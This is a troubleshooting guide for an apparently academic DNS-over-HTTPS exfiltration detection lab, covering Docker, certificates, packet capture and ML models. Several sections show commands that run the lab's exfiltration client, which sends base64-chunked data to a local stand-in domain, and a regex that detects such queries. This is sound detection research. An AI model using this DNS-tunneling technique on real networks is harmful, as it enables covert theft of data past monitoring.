# Troubleshooting Guide

## 🚨 Common Issues and Solutions

### Infrastructure Issues

#### Services Not Starting
**Problem**: Containers fail to start or exit immediately
```bash
# Check service status
docker compose ps

# Common solutions
sudo systemctl start docker                    # Start Docker daemon
docker compose down && docker compose up -d    # Restart services
docker system prune -f                         # Clean Docker cache
```

#### Port Conflicts
**Problem**: "Port already in use" errors
```bash
# Check what's using ports
sudo netstat -tlpn | grep -E ":(80|443|8080)\s"

# Solutions
sudo pkill -f "process_name"                   # Kill conflicting process
# OR modify ports in docker-compose.yml
```

#### Memory/Resource Issues
**Problem**: Out of memory or high CPU usage
```bash
# Check resource usage
docker stats
free -h

# Solutions
docker compose down                            # Stop services
export QUICK_MODE=true                        # Enable quick mode
# Increase Docker memory limits in settings
```

### DoH Server Issues

#### DoH Server Not Responding
**Problem**: Cannot reach https://doh.local/dns-query
```bash
# Diagnostic steps
docker logs doh_server
docker logs traefik
docker exec client_test curl -k https://doh.local/dns-query?name=google.com

# Common fixes
./generate_certs.sh                           # Regenerate certificates
docker compose restart traefik doh_server     # Restart services
```

#### DNS Resolution Failing
**Problem**: DNS queries not resolving
```bash
# Test DNS resolution
docker exec client_test nslookup google.com resolver
docker exec resolver unbound-control status

# Check configuration
docker exec resolver cat /etc/unbound/unbound.conf
```

#### Certificate Issues
**Problem**: TLS/SSL certificate errors
```bash
# Verify certificates
openssl x509 -in certs/doh.local.crt -text -noout
openssl verify -CAfile certs/ca.crt certs/doh.local.crt

# Regenerate if needed
rm -rf certs/*
./generate_certs.sh
docker compose restart traefik
```

### Detection Issues

#### No Exfiltration Detected
**Problem**: Exfiltration attempts not being captured
```bash
# Check detection logs
docker logs exfil_interceptor --tail 50

# Verify network interface
docker exec exfil_interceptor ip link show
docker exec exfil_interceptor tcpdump -i any -c 5

# Test with simple exfiltration
docker exec -it exfil_client python3 -c "
from client import *
config = create_default_config()
client = DoHExfiltrationClient(config)
client.exfiltrate_data(b'test data', 'simple_test')
"
```

#### Pattern Detection Failing
**Problem**: Patterns not matching exfiltration attempts
```bash
# Check pattern configuration
grep -r "DOMAIN\|pattern" exfiltration/server/

# Verify target domain
echo $TARGET_DOMAIN
# Should match exfiltration client domain

# Test pattern manually
python3 -c "
import re
pattern = re.compile(r'(\d+)-(\d+)-(\d+)-(.+)')
test = '1234567890-0001-0010-dGVzdA.abc123.exfill.local'
print(pattern.match(test.split('.')[0]))
"
```

#### Reconstruction Failures
**Problem**: Data reconstruction not working
```bash
# Check chunk assembly
ls -la exfiltration/server/captured/

# Manual decode test
python3 -c "
import base64
test_chunk = 'dGVzdCBkYXRh'  # 'test data' in base64
print(base64.urlsafe_b64decode(test_chunk + '=='))
"

# Check session management
docker exec exfil_interceptor python3 -c "
from server import SimpleExfiltrationServer
server = SimpleExfiltrationServer()
print('Sessions:', server.sessions)
"
```

### ML and Analysis Issues

#### Model Training Failures
**Problem**: ML model training errors
```bash
# Check dataset availability
ls -la datasets/
head -5 datasets/*.csv

# Verify Python environment
docker exec -it exfil_client pip list | grep -E "(sklearn|pandas|numpy)"

# Test with quick mode
cd ml_analyzer
python3 model_trainer.py --quick
```

#### Prediction Errors
**Problem**: predictor.py fails or gives poor results
```bash
# Check model files
ls -la models/
file models/*.pkl

# Verify input data format
head -5 traffic_analyzer/output/output.csv

# Test prediction manually
python3 -c "
import joblib
import pandas as pd
model = joblib.load('models/best_model.pkl')
print('Model loaded successfully')
"
```

#### Filter Script Issues
**Problem**: filter_detection_csv.sh not working
```bash
# Check script permissions
ls -la exfiltration/client/filter_detection_csv.sh
chmod +x exfiltration/client/filter_detection_csv.sh

# Run manually with debug
cd exfiltration/client
bash -x ./filter_detection_csv.sh

# Check input file
wc -l ../../traffic_analyzer/output/output.csv
head -5 ../../traffic_analyzer/output/output.csv
```

### Network Issues

#### Docker Network Problems
**Problem**: Containers cannot communicate
```bash
# Check network configuration
docker network ls
docker network inspect kent-dissertation_dohnet

# Test connectivity
docker exec client_test ping doh_server
docker exec client_test ping resolver

# Recreate network
docker compose down
docker network prune
docker compose up -d
```

#### Interface Detection Issues
**Problem**: Wrong network interface selected
```bash
# Manual interface detection
IFLINK=$(docker exec resolver cat /sys/class/net/eth0/iflink 2>/dev/null)
ip link | grep -B1 "^ *$IFLINK:" | head -n 1

# Override interface
export INTERFACE=eth0  # or correct interface name
docker compose restart exfil_interceptor traffic_analyzer
```

#### Packet Capture Problems
**Problem**: No packets being captured
```bash
# Check capabilities
docker exec exfil_interceptor capsh --print

# Test capture manually
docker exec exfil_interceptor tcpdump -i any -c 10 -n

# Verify filter
docker exec exfil_interceptor tcpdump -i any "port 53 or port 443" -c 5
```

### Performance Issues

#### Slow Detection
**Problem**: Detection taking too long
```bash
# Enable quick mode
export QUICK_MODE=true
export MAX_SAMPLES=1000

# Optimize chunk size
# Edit exfiltration/client/client.py
# Reduce chunk_size to 15-20

# Monitor performance
docker stats
```

#### High Memory Usage
**Problem**: Containers using too much memory
```bash
# Check memory usage
docker stats --no-stream

# Limit memory in docker-compose.yml
deploy:
  resources:
    limits:
      memory: 1G

# Clean up old data
rm -rf exfiltration/server/captured/*
rm -rf traffic_analyzer/output/*
```

#### Storage Issues
**Problem**: Running out of disk space
```bash
# Check disk usage
df -h
docker system df

# Clean up
docker system prune -a
docker volume prune
rm -rf datasets/*.csv.bak
```

## 🔧 Advanced Debugging

### Enable Debug Logging
```bash
# Set debug environment
export LOG_LEVEL=DEBUG
export PYTHONUNBUFFERED=1
export DOH_SERVER_VERBOSE=true

# Restart with debug
docker compose down
docker compose up -d

# View debug logs
docker compose logs -f | grep -E "(DEBUG|ERROR|WARNING)"
```

### Manual Component Testing

#### Test DoH Manually
```bash
# Basic DoH test
curl -k -H "accept: application/dns-json" \
     "https://doh.local/dns-query?name=google.com&type=A"

# Test with custom query
curl -k -H "accept: application/dns-json" \
     "https://doh.local/dns-query?name=test.exfill.local&type=A"
```

#### Test Exfiltration Client
```bash
# Manual client test using JSON configuration
cd exfiltration/client/

# Create simple test configuration
cat > test_debug.json << 'EOF'
{
  "name": "Debug Test",
  "description": "Simple debug configuration",
  "exfiltration_config": {
    "doh_server": "https://doh.local/dns-query",
    "target_domain": "exfill.local",
    "chunk_size": 20,
    "encoding": "base64",
    "timing_pattern": "regular",
    "base_delay": 0.5
  },
  "test_files": ["debug_test.txt"],
  "notes": "Debug configuration for troubleshooting"
}
EOF

# Create test file
echo "Hello World Debug Test" > debug_test.txt

# Run test
python run_client.py --config test_debug.json --file debug_test.txt
```

#### Test Pattern Detection
```python
# Manual pattern test
import re

# Test pattern from server
pattern = re.compile(r"(\d+)-(\d+)-(\d+)-(.+)")
test_queries = [
    "1234567890-0001-0005-dGVzdA.random.exfill.local",
    "1234567890-0002-0005-ZGF0YQ.random.exfill.local"
]

for query in test_queries:
    match = pattern.match(query.split('.')[0])
    if match:
        session_id, index, total, data = match.groups()
        print(f"Detected: session={session_id}, chunk={index}/{total}")
```

## 📋 Health Check Commands

### Quick System Health Check
```bash
#!/bin/bash
echo "=== Docker Health Check ==="
docker --version
docker compose --version
docker compose ps

echo "=== Service Health ==="
curl -k https://doh.local/dns-query?name=google.com 2>/dev/null && echo "DoH: OK" || echo "DoH: FAIL"
docker exec resolver unbound-control status >/dev/null && echo "Resolver: OK" || echo "Resolver: FAIL"
docker logs exfil_interceptor --tail 1 | grep -q "ERROR" && echo "Interceptor: ERROR" || echo "Interceptor: OK"

echo "=== Resource Usage ==="
docker stats --no-stream --format "table {{.Container}}\t{{.CPUPerc}}\t{{.MemUsage}}"

echo "=== Disk Usage ==="
df -h | grep -E "(/$|/var/lib/docker)"
```

### Reset Everything
```bash
#!/bin/bash
echo "Stopping all services..."
docker compose down -v

echo "Cleaning Docker system..."
docker system prune -af
docker volume prune -f

echo "Removing old data..."
rm -rf exfiltration/server/captured/*
rm -rf traffic_analyzer/output/*
rm -rf models/*

echo "Regenerating certificates..."
rm -rf certs/*
./generate_certs.sh

echo "Starting services..."
docker compose up -d

echo "Waiting for services to start..."
sleep 30

echo "Testing DoH connectivity..."
docker exec -it client_test curl -k https://doh.local/dns-query?name=google.com
```

This troubleshooting guide should help resolve most common issues encountered while using the DoH Exfiltration Detection Platform.
